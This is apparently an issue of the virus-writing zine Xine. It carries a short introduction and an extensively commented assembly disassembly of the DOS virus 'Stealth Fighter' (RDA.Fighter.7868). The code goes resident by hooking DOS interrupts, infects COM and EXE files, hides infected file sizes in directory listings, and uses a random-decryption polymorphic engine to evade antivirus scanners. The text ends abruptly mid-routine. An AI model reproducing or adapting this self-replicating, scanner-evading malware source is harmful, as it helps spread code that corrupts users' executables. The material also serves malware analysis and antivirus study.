   ;
   ;
   ;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                              ³ Xine - issue #5 - Phile 216 ³
   ;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;
   ;
   ;
   ; comment   *
   ; Virusname: Stealth Fighter, DEMO Part 3.2
   ; Other names: RDA.Fighter.7868
   ; Type: Poly TSR COM/EXE Semistealth
   ; Disasm:   Darkman and b0z0
   ;
   ; General   description:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  This is a quite old but interesting DOS virus,   one of the first ones using
   ; the RDA, random   decryption algorithm, idea. With RDA the decryption method
   ; (so both keys and mathematical operations) will   not be stored in the
   ; decryptor. Indeed the RDA algorithm will try to   decrypt the encrypted body
   ; with all the possible implemented methods until   the right one will be
   ; choosen, this is when the virus   body will become plaintext. To decide if
   ; the virus body was sucesfully decrypted   the virus will compare the stored
   ; CRC, calculated   at decryptor generator, with the one calculated on the
   ; computed data. To make AV disinfection even harder the virus will encrypt
   ; a small   random part of the original host and decrypt it in memory just
   ; before executing it.
   ;  The virus includes also an ECC, error correcting code,   algorithm that is
   ; a piece   of code that can find, and in some cases also correct, modifications
   ; to the body of the virus. This is of course an interesting feature to prevent
   ; in memory patching/debugging of   the code. The ECC routine will be executed
   ; before and after each file infection.
   ;  The virus includes also a very   primitive interrupt tunneling routine and
   ; has semistealth   features (stealth on FCB/DTA findnext, correctly avoiding
   ; problems with CHKDSK).
   ;
   ; Poly and RDA:
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;  The virus has an interesting and quite   big polymorphic engine. It can
   ; generate up to 8 layers   of decryption. It can generate quite a lot of different
   ; garbage   and encryption types. It is interesting that in the first part of the
   ; decryptor generation the virus will generate garbage instructions that will
   ; actually set up   the registers to some useful value for the real decryption
   ; stage (like the   key value). So there aren't any real obvious initialization
   ; steps of in the   decryptor. To encrypt the virus body (and other encryption
   ; layers)   the poly will just execute the generated decryptor in memory, to
   ; get the   same results from the garbage instructions, and then fix the memory
   ; changing instructions to the inverse ones. There are quite some   garbage
   ; instruction that can be   generated, with many int calls and also ax/al only
   ; opcodes. Browse   the i_table table in the source for a complete list.
   ;  The RDA decryptor generator (this layer is not   included in the 8 layers count
   ; of the previous   part) is created on a fixed structure basis. A generic model
   ; (starting from rda_basic_body label) will be filled with garbage instructions,
   ; taking care of not modifying the used registers. To accomplish this the   RDA
   ; uses a pretty big step description table, that tells how many bytes have to
   ; be copied from the generic model and then which   registers can garbage mess up
   ; and which not.
   ;
   ;  Well, enough word, here comes the fully commented code. Many longer
   ; explanations have been included   in the code at the most interesting parts,
   ; so we won't spend any more words in this short introduction :)
   ; *

   .model tiny
   .code
    org   100h

    code_begin:
            nop
            nop
   virus_begin:
            call    delta_offset
   delta_offset:
            pop     si          ; Load SI from stack (delta offset)

            cld             ; Clear direction flag
            sub     si,offset delta_offset

            sub     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table

            cmp     word ptr ds:[(31h*04h+01h)],'FS'
            jne     move_virus      ; Not equal? Jump to move_virus
            cmp     byte ptr ds:[(31h*04h+02h+01h)],20h
            jae     virus_exit      ; Above or equal? Jump to virus_exit

            mov     cs:[runtim_patch],(runtim_patch-runtim_patch)
   move_virus:
            mov     word ptr ds:[(31h*04h+01h)],'FS'
            mov     byte ptr ds:[(31h*04h+02h+01h)],20h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    es          ; Save ES at stack
            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,[si+data_]   ; DI = offset of data_
            mov     cx,(data_end-data_begin)
            rep     stosb       ; Zero data_

            lea     di,[bp+data__]  ; DI = offset of data__
            mov     cx,(data_end_-data_begin_)
            rep     stosb       ; Zero data__
            pop     es          ; Load ES from stack

            add     si,offset code_begin
            lea     ax,resize_mem   ; AX = offset of resize_mem
            push    es ax       ; Save registers at stack
            mov     di,100h         ; DI = offset of beginning of code
            mov     ax,di       ; AX =   "    "      "     "   "
            mov     cx,(code_end-virus_begin)/02h
            cld             ; Clear direction flag
            rep     movsw       ; Move the virus below Program Seg...

            retf            ; Return far
   virus_exit:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            cmp     [si+encrypt_stat],00h
            je      vir_com_exit    ; Host not encrypted? Jump to vir_...

            mov     di,[si+crypt_ptr]   ; DI = file pointer to encrypted/d...
            sub     di,[si+header_size_]
            add     di,100h         ; DI = offset of encrypted data
            call    decrypt_host
   vir_com_exit:
            cmp     word ptr [si+offset need_segovv],01h
            jne     vir_exe_exit    ; EXE executable? Jump to vir_exe_...

            mov     di,100h         ; DI = offset of beginning of code
            push    es di       ; Save registers at stack
            lea     si,[si+file_header] ; SI = offset of file_header
            cld             ; Clear direction flag
            movsw           ; Move the original code to beginning
            movsb           ;  "    "     "      "   "  "

            jmp     virus_exit_
   vir_exe_exit:
            cli             ; Clear interrupt-enable flag
            mov     ax,es       ; AX = segment of PSP for current ...

            add     ax,word ptr [si+file_header+0eh]
            add     ax,10h      ; AX = initial SS relative to star...
            mov     ss,ax       ; SS =    "    "     "     "     "

            mov     sp,word ptr [si+file_header+10h]
            sti             ; Set interrupt-enable flag

            mov     ax,es       ; AX = segment of PSP for current ...
            add     ax,10h      ; AX = segment of beginning of EXE...
            add     ax,word ptr [si+file_header+16h]
            push    ax          ; Save initial CS relative to star...
            push    word ptr [si+file_header+14h]

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)
   virus_exit_:
            xor     ax,ax       ; Zero AX
            xor     bx,bx       ; Zero BX

            retf            ; Return

            db      '"RandomDecodingAlgorithmEngine 1.1"'
   data_begin:
   data_:
   rda_checkvalue  dw  00h     ; contains the value calculated by
                       ; rda to see if the body was correctly
                       ; decrypted
   head_begin:
   file_header  db      11001101b,00100000b
            db      11101000b       ; CALL imm16 (opcode 0e8h)
            db      17h dup(?)      ; File header
   head_end:
   crypt_ptr    dw      ?           ; File pointer to encrypted/decryp...
   crypt_key    db      ?           ; Encryption/decryption key
   crypt_length dw      ?           ; Length of encrypted/decrypted data
   header_size  dw      ?           ; Header size
   encrypt_stat db      00h         ; Status of host encryption
   header_size_ dw      ?           ; Header size
   data_end:
   resize_mem:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     [first_data],00h
            mov     [second_data],01h
            mov     [cache_stat],00h    ; Examine if disk is cached

            mov     bx,(data_end__-code_begin+0fh)/10h+11h
            mov     ah,4ah      ; Resize memory block
            int     21h

   runtim_patch equ     byte ptr $+01h  ; Offset of runtime patch
            jmp     get_set_int
   call_rda_fun:
            mov     [runtim_patch],(get_set_int-call_rda_fun)

            mov     ax,0eeeeh       ; RDA.7868 function
            int     21h
   get_set_int:
            mov     bx,21h      ; BX = interrupt vector 21h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int21_addr],bx
            mov     word ptr [int21_addr+02h],es

            call    tunnel_int13
            call    tunnel_int21

            lea     dx,int21_virus  ; DX = offset of int21_virus
            pop     bx          ; Load BX from stack
            call    set_int_addr

            mov     bx,08h      ; BX = interrupt vector 08h
            push    bx          ; Save BX at stack
            call    get_int_addr
            mov     word ptr [int08_addr],bx
            mov     word ptr [int08_addr+02h],es
            lea     dx,int08_virus  ; DX = offset of int08_virus
            pop     bx          ; Load BX from stack
            call    set_int_addr

            call    rnd_init_seed

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     bx,ds_      ; BX = offset of ds_
            mov     [bx+(ds__-ds_)],ds  ; Store data segment
            mov     ds,ds:[2ch]     ; DS = segment of environment segment
            xor     si,si       ; Zero SI
   find_zero:
            lodsw           ; AX = two bytes of environment va...

            dec     si          ; SI = offset within environment v...
            cmp     ax,00h      ; End of environment variables?

            jne     find_zero       ; Not equal? Jump to find_zero

            add     si,03h      ; SI = offset of filename
            mov     dx,si       ; DX =   "    "     "

            cli             ; Clear interrupt-enable flag
            mov     ax,cs       ; AX = code segment
            mov     ss,ax       ; SS = stack segment

            lea     sp,stack_ptr    ; SP = offset of stack_ptr
            sti             ; Set interrupt-enable flag

            mov     ax,4b00h        ; Load and execute program
            int     21h

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            jc      virus_exit__    ; Error? Jump to virus_exit__

            mov     ax,4d00h        ; Get return code (normal)
            int     21h
   virus_exit__:
            push    ax          ; Save AX at stack
            mov     es,ds:[2ch]     ; ES = segment of environment segment
            mov     ah,49h      ; Free memory
            int     21h

            mov     ax,ds       ; AX = segment of PSP for current ...
            dec     ax          ; AX = segment of current Memory C...
            mov     es,ax       ; ES = segment of Memory Control B...
            mov     word ptr es:[01h],08h

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)
            pop     ax

            mov     ah,4ch      ; Terminate with return code
            int     21h
   data_begin_:
   data__:
   ; this is the body of the rda algorithm. some part will be added and modified
   ; at runtime tho.
   rda_basic_body:
           call    rda_delta_offset_calc
   rda_delta_off_sub:

   rda_first_dw_0  dw  00h
   rda_second_dw_0 dw  00h     ; will contain length
   rda_third_dw_0  dw  00h     ; will contain initial key
   rda_fourth_dw_0 dw  00h     ; steps for rda_calculate_value_in_dx

   rda_first_db_0  db  00h     ; first execution mark if 0ffh, used
                       ; to reinit rng from time to time
           db  90h     ; padding

   rda_modulusv    dw  10h
   rda_modulusv2   dw  00h

   rda_sp_storage  dw  00h

   off_to_table_2  dw  00h     ; will contain the offset to the part
                       ; of the table_2 used
   enc_dec_byte    db  00h     ; 0 encrypting, 1 decrypting. used
                       ; to reference the right rda_to_part_2
                       ; table segment

           db  90h

   rnd_seed_1  dw  00h     ; values for the rng
   rnd_seed_2  dw  00h

           db  8Fh
           db  76h

   rda_to_part_1:
           db  4 * 4 dup (00h)
   rda_to_part_1_end:

   rda_to_part_2:
           db  10h * 4 dup (00h)
   rda_to_part_2_end:


   rtc_comm_routine:
           out 70h, al     ; send command to rtc passed in al
           jmp short $+2
           in  al, 71h     ; read response
           ret

           db 0E8h         ; call opcode


   rda_get_datetime:
           push    ax bx cx dx
           push    ds
           mov ax, 0FFFFh
           mov ds, ax
           mov al, ds:0Eh
           pop ds
           cmp al, 0FCh        ; AT?
           jz  get_data_with_rtc   ; If the computer is an AT
                           ; get system time through
                           ; ports, otherwise get system
                           ; time through interrupts

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (get_data_with_dos-get_data_with_rtc)
   get_data_with_rtc:
           mov ax, 0           ; get seconds
           call    rtc_comm_routine
           mov cl, al
           mov ax, 2           ; get minutes
           call    rtc_comm_routine
           mov ch, al
           mov ax, 4           ; get hours (12 hours mode)
           call    rtc_comm_routine
           mov dl, al
           mov ax, 6           ; get day of week
           call    rtc_comm_routine
           mov dh, al

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (store_datetime-get_data_with_dos)
   get_data_with_dos:
           mov ah, 2Ch
           int 21h     ; DOS - GET CURRENT TIME

   store_datetime:
           add [si+offset rnd_seed_1], cx
           add [si+offset rnd_seed_2], dx
           pop dx cx bx ax
           ret

           db 0E8h         ; call opcode


   random_value_with_modulus:
           cmp ax, 0           ; is limit 0? if so go away
           jnz continue_rngwm

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rvwm_ret-continue_rngwm)
   continue_rngwm:
           push    bx cx dx
           pushf
           push    ax
           call    random_generator
           pop ax
           xchg    ax, dx
           mov bx, dx
           xor dx, dx
           inc bx          ; and just limit it with our
           cmp bx, 0           ; desired value
           jz  no_need_to_div
           div bx
           xchg    ax, dx
   no_need_to_div:
           popf
           pop dx cx bx
   rvwm_ret:
           ret

           db 0E8h             ; call opcode

   random_generator:
           mov ax, [si+offset rnd_seed_1]
           mov bx, [si+offset rnd_seed_2]
           mov cx, ax
           mov dx, 8405h
           mul dx
           add cx, cx
           add cx, cx
           add cx, cx
           add ch, cl
           add dx, cx
           mov cl, 1
   data_end_    equ     $+01h       ; End of data__
           and cl, bl
           ror cl, 1
           add dx, bx
           add bx, bx
           add bx, bx
           add dx, bx
           add dh, bl
           add dh, cl
           add ax, 1
           adc dx, 0
           mov [si+offset rnd_seed_1], ax
           mov [si+offset rnd_seed_2], dx
           ret

           db 0E8h             ; call opcode

   rda_encdec_routine:
           cmp byte ptr [si+offset enc_dec_byte], 0
           jz  rda_decryption_stage

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_encryption_stage-rda_decryption_stage)
   rda_decryption_stage:
           lea ax, [si+offset rda_to_part_2]   ; to mom instructions
           mov [si+offset off_to_table_2], ax
           mov ax, [si+offset rda_first_dw_0]
           mov di, [si+offset rda_first_dw_0]
           mov [si+offset rda_off_todi], ax

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_prepare_forencdec-rda_encryption_stage)
   rda_encryption_stage:
           lea ax, [si+offset rda_to_part_2 + 20h] ; to reverse ones
           mov [si+offset off_to_table_2], ax
           mov ax, [si+offset rda_first_dw_0]
           mov [si+offset rda_off_todi], ax

           xor bx, bx
           mov cx, 10h
   rda_findbeginning:
           shl bx, 1
           shr ax, 1
           adc bx, 0
           loop    rda_findbeginning

           mov ax, bx
           mov di, 10h
           sub di, [si+offset rda_first_dw_0]

   rda_prepare_forencdec:
           shl di, 1
           mov [si+offset rda_sp_storage], sp
           cli
           lea sp, [si + offset enc_dec_instr + 2] ; antidebug
           mov bp, si

   rda_loop_selection:
           shr ax, 1
           jb  rda_gotorealencdec

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_notthisevol-rda_gotorealencdec)
   rda_gotorealencdec:
           and di, 1Eh
           mov cx, di
           add di, [si+offset off_to_table_2]
           push    word ptr [di]
           mov di, cx
           push    word ptr [si+offset rda_third_dw_0]
           mov [si+offset restore_di_aft], di

           db  0bfh    ; mov di
   rda_off_todi    dw  00h

           or  di, 0FFF0h
           dec di
           mov cx, [si+offset rda_second_dw_0] ; lenght
           shr cx, 1
           lea bx, [si+offset rda_end_basic_bodycode]  ; what to enc

           db  0bah            ; mov dx,
           dw  00h         ; key is placed here with
                           ; the second push
   rda_mathloopz:
   enc_dec_instr   dw  00h         ; the real instruction is
                           ; placed here via a push
           add dx,[bp+di+offset rda_end_basic_bodycode]
           dec di
           or  di,0ff80h
           dec di

           inc bx
           inc bx
           loop    rda_mathloopz

           db  0bfh            ; mov di,
   restore_di_aft  dw  00h
           add sp,4            ; stack again on right pos

   rda_notthisevol:
           inc di
           inc di
           or  ax, ax
           jz  rda_end_loop_sel

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_loop_selection-rda_end_loop_sel)
   rda_end_loop_sel:
           push    ax
           push    ax
           mov word ptr [si+offset restore_di_aft], 0
           mov word ptr [si+offset rda_off_todi], 0
           mov sp, [si+offset rda_sp_storage]
           sti
           ret

   ; will calculate if the body was correctly decrypted returning in dx the calc
   ; value
   rda_calculate_value_in_dx:
           mov cx, [si+offset rda_fourth_dw_0]
           shr cx, 1
           lea di, [si+offset rtc_comm_routine]
           mov dx, 20h
           mov bp, 695Fh
           mov ax, 4653h

   rda_calcloop1:
           add ax, [di]
           mov bl, al
           and bx, 0Fh
           add ax, [bx+di]
           xor bp, [bx+di]
           mov bl, ah
           or  bx, 0FFF0h
           sub ax, [bx+di]

   rda_init_storage_1:
           db    0 ; an instruction from the rda_table_part_1 will
           db    0 ; be placed here (the second two bytes)
   rda_init_storage_2:
           db    0 ; and here the first two bytes of the same entry of
           db    0 ; before

           inc di
           inc di
           loop    rda_calcloop1

           add dx, bp
           mov word ptr [si+offset rda_init_storage_1], 0
           mov word ptr [si+offset rda_init_storage_2], 0
           ret             ; reset the ops and ret

           db 0E8h             ; call opcode


   rda_delta_offset_calc:
           pop si      ; usual delta offset calculation
           nop
           sub si, offset rda_delta_off_sub
           push    cs
           pop ds

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_goentry_run-rda_reencrypt_and_redo)
   rda_reencrypt_and_redo:
           mov byte ptr [si+offset enc_dec_byte], 1    ; reencrypt
           call    rda_encdec_routine

   rda_goentry_run:
           inc byte ptr [si+offset rda_first_db_0]
           jnz rda_norandom_reinit
           call    rda_get_datetime

   rda_norandom_reinit:
           mov ax, [si+offset rda_modulusv]
           call    random_value_with_modulus
           mov [si+offset rda_first_dw_0], ax
           mov byte ptr [si+offset enc_dec_byte], 0    ; decrypt
           call    rda_encdec_routine
           mov ax, [si+offset rda_modulusv2]
           call    random_value_with_modulus
           mov bx, ax          ; select one pair from the
           shl bx, 1           ; table 1, replace and try
           shl bx, 1           ;to calculate
           lea di, [bx+si+offset rda_to_part_1]
           mov ax, [di]
           mov [si+offset rda_init_storage_1], ax
           mov ax, [di+2]
           mov [si+offset rda_init_storage_2], ax
           call    rda_calculate_value_in_dx
           lea di, [si+offset rda_end_basic_bodycode]

   rda_add_di_instr:
           add di,offset rda_checkvalue-100h
           cmp cs:[di], dx     ; decrypted succeully?
           jz  rda_end_basic_bodycode

           db  11101001b       ; JMP imm16 (opcode 0e9h)
           dw  (rda_reencrypt_and_redo-rda_end_basic_bodycode)
   rda_end_basic_bodycode:             ; ok, so it's decrypted ok
           nop             ; and we can proceed
           nop

           xchg    bx, bx
           xchg    bx, bx          ; variable number of do nothing
           xchg    bx, bx          ; ops to change offset of the
           xchg    bx, bx          ; stored calc value will be
           xchg    bx, bx          ; stored. in virus body just to
           xchg    bx, bx          ; pad the lenght to 10h boundary
           nop             ; for ECC use
   ; rda basic body end.

   int08_virus  proc    near        ; Interrupt 08h of RDA.7868
   int08_patch  equ     $           ; Offset of interrupt 08h patching
            cmp     cs:[int08_stat],00h ; Restore interrupt 21h?
            jnz     int08_exit_     ; Not zero? Jump to int08_exit_

            push    ax es ds        ; Save registers from stack
            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            cmp     word ptr ds:[(21h*04h++02h)],800h
            ja      int08_exit      ; Above? Jump to int08_exit

            mov     cs:[int08_stat],01h ; Don't restore interrupt 21h

            les     ax,ds:[(21h*04h)]   ; ES:AX = address of interrupt 21h
            mov     word ptr cs:[int21_addr],ax
            mov     word ptr cs:[int21_addr+02h],es
            mov     word ptr cs:[int21_addr_],ax
            mov     word ptr cs:[int21_addr_+02h],es

            mov     word ptr ds:[(21h*04h)],offset int21_virus
            mov     ds:[(21h*04h++02h)],cs

            mov     word ptr ds:[(31h*04h+01h)],'FS'
            mov     byte ptr ds:[(31h*04h+02h+01h)],20h

            call    rnd_init_seed
   int08_exit:
            pop     ds es ax        ; Load registers from stack
   int08_exit_:
            inc     cs:[int08_count]    ; Increase interrupt 08h counter
            test    cs:[int08_count],00000001b
            jnz     int08_exit__    ; Not zero? Jump to int08_exit__

            push    ax          ; Save AX at stack
            mov     al,20h      ; AL = interrupt request/in-servic...
            out     20h,al      ; Store initialization command wor...
            pop     ax          ; Load AX from stack

            iret            ; Interrupt return
   int08_exit__:
            jmp     cs:[int08_addr]
            endp

   int24_virus  proc    near        ; Interrupt 24h of RDA.7868
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return
            endp

   int13_call   proc    near        ; Call to address of interrupt 13h
            pushf           ; Save flags at stack
            call    cs:[int13_addr]

            ret             ; Return
            endp
   fcb_stealth_:
            pop     ax          ; Load AX from stack

            push    bx es       ; Save registers at stack
            push    ax          ; Save AX at stack
            mov     ah,2fh      ; Get Disk Transfer Area (DTA) add...
            call    int21_call
            pop     ax          ; Load AX from stack

            call    int21_call
            cmp     al,0ffh         ; Not successful?
            je      fcb_ste_exit    ; Equal? Jump to fcb_ste_exit

            push    ax          ; Save AX at stack
            cmp     byte ptr es:[bx],0ffh
            jne     not_extended    ; Not extended FCB? Jump to not_ex...

            add     bx,07h      ; BX = offset of normal FCB
   not_extended:
            mov     ax,es:[bx+17h]  ; AX = file time
            call    tst_infected
            pop     ax          ; Load AX from stack
            jnc     fcb_ste_exit    ; Not infected? Jump to fcb_ste_exit

            mov     cs:[filenam_addr],bx
            inc     cs:[filenam_addr]   ; Store address of filename
            mov     cs:[dta_fcb_stat],01h

            add     bx,1dh      ; BX = offset of filesize
            call    size_stealth
   fcb_ste_exit:
            pop     es bx       ; Load registers from stack

            iret            ; Interrupt return
   dta_stealth_:
            pop     ax          ; Load AX from stack

            push    bx es       ; Save registers at stack
            push    ax          ; Save AX at stack
            mov     ah,2fh      ; Get Disk Transfer Area (DTA) add...
            call    int21_call
            pop     ax          ; Load AX from stack

            call    int21_call
            jc      dta_st_exit     ; Error? Jump to dta_st_exit

            push    ax          ; Save AX at stack
            mov     ax,es:[bx+16h]  ; AX = file time
            call    tst_infected
            pop     ax          ; Load AX from stack
            jnc     dta_ste_exit    ; Not infected? Jump to dta_ste_exit

            mov     cs:[filenam_addr],bx
            add     cs:[filenam_addr],1eh
            mov     cs:[dta_fcb_stat],00h

            add     bx,1ah      ; BX = offset of filesize
            call    size_stealth
   dta_ste_exit:
            pop     es bx       ; Load registers from stack

            clc             ; Clear carry flag

            retf    02h         ; Return far and add option-pop-va...
   dta_st_exit:
            pop     es bx       ; Load registers from stack

            stc             ; Set carry flag

            retf    02h         ; Return far and add option-pop-va...

   int21_virus  proc    near        ; Interrupt 21h of RDA.7868
   int21_patch  equ     $           ; Offset of interrupt 21h patching
            push    ax          ; Save AX at stack
            inc     ah          ; Increase function number
            cmp     ax,0efeeh       ; RDA.7868 function?
            jne     exam_terminat   ; Not equal? Jump to exam_terminat

            call    patch_ints
            pop     ax          ; Load AX from stack

            iret            ; Interrupt return
   exam_terminat:
            cmp     ax,4c00h        ; Terminate with return code (no...)?
            je      infect_file     ; Equal? Jump to infect_file
            cmp     ah,3eh      ; Close file?
            je      infect_file     ; Equal? Jump to infect_file
            cmp     ah,57h      ; Get or set file's date and time?
            je      infect_file     ; Equal? Jump to infect_file
            cmp     ah,4fh      ; Find next matching file (DTA)?
            je      dta_stealth     ; Equal? Jump to dta_stealth
            cmp     ah,50h      ; Set PSP address?
            jne     exam_find_ne    ; Not equal? Jump to exam_find_ne
   dta_stealth:
            jmp     dta_stealth_
   exam_find_ne:
            cmp     ah,12h      ; Find next matching file (FCB)?
            je      fcb_stealth     ; Equal? Jump to fcb_stealth
            cmp     ah,13h      ; Delete file (FCB)?
            jne     exam_get_ret    ; Not equal? Jump to exam_get_ret
   fcb_stealth:
            cmp     cs:[chkdsk_stat],01h
            je      exam_get_ret    ; Equal? Jump to exam_get_ret

            jmp     fcb_stealth_
   exam_get_ret:
            cmp     ah,4dh      ; Get return code?
            jne     int21_exit_     ; Not equal? Jump to int21_exit_

            mov     cs:[chkdsk_stat],00h

            push    ds dx       ; Save registers at stack
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,20h      ; Random number within thirty-two
            call    get_random_limit
            or      ax,ax       ; Write string to standard output?
            jnz     int21_exit      ; Not zero? Jump to int21_exit

            mov     ah,09h      ; Write string to standard output
            lea     dx,string       ; DX = offset of string
            call    int21_call
   int21_exit:
            pop     dx ds       ; Load registers from stack
   int21_patch_ equ     $           ; Offset of interrupt 21h patching
   int21_exit_:
            pop     ax          ; Load AX from stack
   int21_exit__:
            jmp     cs:[int21_addr]
            endp

   int21_call   proc    near        ; Call to address of interrupt 21h
            pushf           ; Save flags at stack
            call    cs:[int21_addr]

            ret             ; Return
            endp
   infect_file:
            call    ecc_prepare
            mov     word ptr cs:[int21_patch_],1001000011001111b
            mov     word ptr cs:[int21_patch_+02h],'FS'
            call    ecc_prepare

            call    examine_file
            jnz     int21_exit_     ; No error? Jump to int21_exit_

            mov     cs:[ss__],ss    ; Store stack segment
            mov     cs:[sp__],sp    ; Store stack pointer
            mov     ax,cs       ; ax = code segment
            cmp     ax,cs:[ss__]    ; Code segment equal to stack seg...?
            je      not_set_sssp    ; Equal? Jump to not_set_sssp

            cli             ; Clear interrupt-enable flag
            push    cs          ; Save CS at stack
            pop     ss          ; Load SS from stack (CS)

            lea     sp,stack_ptr    ; SP = offset of stack_ptr
            sti             ; Set interrupt-enable flag
   not_set_sssp:
            push    ax bx cx dx di si bp es ds
            cmp     cs:[cache_stat],00h ; Examine if disk is cached?
            jne     no_cach_exam    ; Not equal? Jump to no_cach_exam

            push    ds dx       ; Save registers at stack
            call    exam_cache
            pop     dx ds       ; Load registers from stack
   no_cach_exam:
            call    restore_int

            call    lod_file_inf
            jc      infect_exit     ; Error? Jump to infect_exit
            mov     ax,cs:[file_time]   ; AX = file's time

            call    tst_infected
            jnc     read_header     ; Not infected? Jump to read_header
   infect_exit:
            jmp     infect_exi
   read_header:
            push    ds dx       ; Save registers at stack
            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            call    rnd_init_seed

            mov     ah,3fh      ; Read from file
            mov     cx,1ah      ; Read twenty-six bytes
            lea     dx,file_header_     ; DX = offset of file_header_
            int     21h
            jnc     move_header     ; No error? Jump to move_header

            jmp     infect_exit_
   move_header:
            lea     si,file_header_     ; SI = offset of file_header_
            lea     di,file_header  ; DI = offset of file_header
            mov     cx,(head_end-head_begin)
            cld             ; Clear direction flag
            rep     movsb       ; Move twenty-six bytes

            cmp     word ptr [file_header],'ZM'
            je      examine_exe     ; Found EXE signature? Jump to exa...
            cmp     word ptr [file_header],'MZ'
            jne     examine_com     ; Didn't find EXE signature? Jump ...
   examine_exe:
            mov     [need_segovv],00h   ; EXE executable

            jmp     exam_filesiz
   examine_com:
            mov     [need_segovv],01h   ; COM executable
   exam_filesiz:
            call    set_file_eof
            or      dx,dx       ; Filesize too small?
            jnz     sto_filesize    ; Not zero? Jump to sto_filesize
            cmp     ax,1000h        ; Filesize too small?
            jb      infect_exit_    ; Below? Jump to infect_exit_
   sto_filesize:
            mov     word ptr [filesize],ax
            mov     word ptr [filesize+02h],dx

            mov     si,[need_segovv]    ; SI = executable
            shl     si,01h      ; Multiply executable with two
            call    [si+prepare_file]
            jc      infect_exit_    ; Error? Jump to infect_exit_
            call    crypt_action

            push    si bx       ; Save registers at stack
            mov     bx,ax       ; BX = decryptor's offset
            mov     si,100h         ; SI = delta offset
            mov     cx,(code_end-virus_begin)
            lea     di,data_buffer  ; DI = offset of data_buffer
            call    ppmle_gen
            pop     bx si       ; Load registers from stack

            mov     ax,cs:[file_time]   ; AX = file's time
            and     ax,1111111111100000b
            or      al,00000001b    ; Set infection mark
            mov     cs:[file_time],ax   ; Store file's time

            push    cx dx       ; Save registers at stack
            call    [si+infect_file_]

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            call    set_file_eof
            pop     dx cx       ; Load registers from stack

            mov     ah,40h      ; Write to file
            int     21h

            lea     dx,filesize_    ; DX = offset of filesize_
            mov     cx,02h      ; Write two bytes

            add     ax,cx       ; Add two to length of decryptor +...
            mov     [filesize_],ax  ; Store filesize_

            mov     ah,40h      ; Write to file
            int     21h
   infect_exit_:
            pop     dx ds       ; Load registers from stack
   infect_exi:
            call    sto_file_inf

            call    get_int_add_
            pop     ds es bp si di dx cx bx ax

            cli             ; Clear interrupt-enable flag
            mov     ss,cs:[ss__]    ; SS = stack segment
            mov     sp,cs:[sp__]    ; SP = stack pointer
            sti             ; Set interrupt-enable flag

            jmp     int21_exit_

   set_file_eof proc    near        ; Set current file position (EOF)
            mov     ax,4202h        ;  "     " "      "       "

   set_file_pos proc    near        ; Set current file position
            xor     cx,cx       ; CX:DX = offset from origin of ne...
            xor     dx,dx       ;   "   "   "     "     "    "    "
            int     21h

            ret             ; Return
            endp
            endp

   patch_ints   proc    near        ; Patch interrupt 08h and 21h
            cli             ; Clear interrupt-enable flag
            mov     byte ptr cs:[int21_patch],11101001b
            mov     word ptr cs:[int21_patch+01h],(int21_exit__-int21_patch-03h)
            mov     byte ptr cs:[int08_patch],11101001b
            mov     word ptr cs:[int08_patch+01h],(int08_exit__-int08_patch-03h)

            ret             ; Return
            endp

   crypt_action proc    near        ; Read plain data, encrypt it, wri...
            push    ax          ; Save AX at stack
            mov     [encrypt_stat],00h  ; Host not encrypted

            cmp     [need_segovv],01h   ; COM executable?
            je      crypt_com       ; Equal? Jump to crypt_com

            mov     ax,word ptr [file_header+08h]
            mov     cl,04h      ; Multiply with paragraphs
            shl     ax,cl       ; Header size
            mov     [header_size_],ax   ; Store header size
            mov     [header_size ],ax   ;   "     "     "

            mov     cx,word ptr [file_header+06h]
            jcxz    no_relocatio    ; No relocations? Jump to no_reloc...

            push    cx          ; Save CX at stack
            mov     dx,word ptr [file_header+18h]
            xor     cx,cx       ; CX:DX = offset from origin of ne...
            mov     ax,4200h        ; Set current file position (SOF)
            int     21h

            mov     cx,04h      ; Read four bytes
            lea     dx,reloca_entry     ; DX = offset of reloca_entry
            mov     ah,3fh      ; Read from file
            int     21h
            pop     cx          ; Load CX from stack
            jnc     calc_relocat    ; No error? Jump to calc_relocat

            jmp     crypt_exit
   calc_relocat:
            mov     ax,word ptr [reloca_entry+02h]
            cmp     ax,1000h        ; No need to calculate the offset...?
            jnb     no_calc_relo    ; Not below? Jump to dont_mul_rel

            shl     ax,01h      ; Multiply high-order word of reloc...
            shl     ax,01h      ;    "     "   "   "     "
            shl     ax,01h      ;    "     "   "   "     "
            shl     ax,01h      ;    "     "   "   "     "
            add     ax,word ptr [reloca_entry]
            jc      no_calc_relo    ; Carry? Jump to no_calc_relo
            add     ax,[header_size_]   ; Add headersize to offset of firs...
            jc      no_calc_relo    ; Carry? Jump to no_calc_relo

